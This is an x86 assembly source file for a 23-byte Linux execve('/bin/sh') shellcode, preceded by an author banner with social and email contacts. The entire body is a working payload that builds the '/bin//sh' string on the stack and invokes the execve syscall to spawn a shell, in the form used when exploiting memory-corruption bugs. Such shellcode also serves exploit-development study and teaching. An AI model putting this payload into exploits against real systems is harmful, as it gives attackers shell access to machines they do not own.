;    *****************************************************
 ;   *    Linux/x86 execve /bin/sh shellcode 23 bytes    *
 ;   *****************************************************
 ;   *	  	  Author: Hamza Megahed		        *
 ;   *****************************************************
 ;   *             Twitter: @Hamza_Mega                  *
 ;   *****************************************************
 ;   *     blog: hamza-mega[dot]blogspot[dot]com         *
 ;   *****************************************************
 ;   *   E-mail: hamza[dot]megahed[at]gmail[dot]com      *
 ;   *****************************************************
[SECTION .text]
global _start
_start:
	xor    eax, eax
	push   eax
	push   0x68732f2f
	push   0x6e69622f
	mov    ebx,esp
	push   eax
	push   ebx
	mov    ecx,esp
	mov    al, 0xb
	int    0x80
